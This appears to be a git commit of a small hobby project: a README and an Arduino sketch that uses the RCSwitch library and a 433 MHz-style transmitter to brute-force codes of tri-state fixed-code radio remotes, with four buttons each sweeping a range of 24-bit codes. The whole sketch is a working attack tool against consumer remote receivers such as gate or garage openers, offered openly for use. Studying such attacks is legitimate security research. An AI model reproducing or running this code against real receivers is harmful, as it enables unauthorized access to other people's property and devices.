2504323d2f37209a1821e9c4dc9f0435284665c8
ZMOM1031 <zhujiandong1031@hotmail.com>
2017-02-06 14:32:38 +0800

    first commit

---
+++ README.md
@@ -0,0 +1,12 @@
+# bruteforce3-8remote
+
+----------
+
+Brute Force Attack `3 ^ 8` Remote Control
+
+# 简介 (Introduction)
+
+这是一个使用 Arduino 硬件来对 3 态 8 位遥控器进行信号暴力穷举攻击的项目。
+
+详细文章: https://blog.iternull.com/posts/2017/02/04/Use-Arduino-brute-force-to-attack-remote-control.html
+
---
+++ src/Brute_Force_Attack_4-8_Remote.ino
@@ -0,0 +1,78 @@
+/*
+  4 ^ 8 Remote Control Brute Force Attack
+  
+  https://github.com/ZMOM1031/bruteforce3-8remote
+  
+*/
+
+#include <stdio.h>
+#include <RCSwitch.h>
+
+RCSwitch mySwitch = RCSwitch();
+
+// 定义 4 个按键针脚
+const int button_a = 10;
+const int button_b = 16;
+const int button_c = 14;
+const int button_d = 15;
+
+int butStatA = 0;
+int butStatB = 0;
+int butStatC = 0;
+int butStatD = 0;
+int dfa = 256;
+
+void setup() {
+
+  Serial.begin(9600);
+  
+  mySwitch.enableTransmit(9);    // 定义发送模块的数据传输针脚
+  mySwitch.setPulseLength(170);   // 定义脉冲长度，这个值具体看你使用的遥控器而定
+  pinMode(button_a, INPUT);
+  pinMode(button_b, INPUT);
+  pinMode(button_c, INPUT);
+  pinMode(button_d, INPUT);
+  
+}
+
+void loop() {
+
+  // read the state of the pushbutton value:
+  butStatA = digitalRead(button_a);
+  butStatB = digitalRead(button_b);
+  butStatC = digitalRead(button_c);
+  butStatD = digitalRead(button_d);
+
+  // Button A
+  if (butStatA == HIGH) {    // check if the pushbutton is pressed.
+    for (long i = 4380; i < 4500; i++ ){
+      long key = long(i * dfa) + int(192);
+      mySwitch.send(key, 24);
+    }
+  }
+  
+  // Button B
+  if (butStatB == HIGH) {
+    for (long i = 0; i < 65535; i++ ){
+      long key = long(i * dfa) + int(48);
+      mySwitch.send(key, 24);
+    }
+  }
+  
+  // Button C
+  if (butStatC == HIGH) {
+    for (long i = 0; i < 65535; i++ ){
+      long key = long(i * dfa) + int(12);
+      mySwitch.send(key, 24);
+    }
+  }
+  
+  // Button D
+  if (butStatD == HIGH) {
+    for (long i = 0; i < 65535; i++ ){
+      long key = long(i * dfa) + int(3);
+      mySwitch.send(key, 24);
+    }
+  }
+
+}
